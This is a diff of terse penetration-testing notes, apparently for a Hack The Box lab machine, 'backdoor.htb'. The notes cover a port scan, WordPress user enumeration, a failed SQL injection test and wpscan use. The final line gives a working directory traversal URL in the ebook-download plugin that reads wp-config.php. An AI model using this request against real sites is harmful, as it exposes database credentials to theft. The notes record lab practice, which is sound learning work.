@@ -2,7 +2,7 @@ nmap
 
 80
 22
-
+1337
 ***
 
 http
@@ -41,3 +41,17 @@ admin userfound.
 username enum on wordpress
 
 WordPress/5.8.1
+
+***
+
+tested sql on wp-login.php : failed
+
+***
+
+http://backdoor.htb/wp-includes/ : looks interesting.
+
+run wpscan using api tokens
+
+direcotry traversal found :
+
+http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
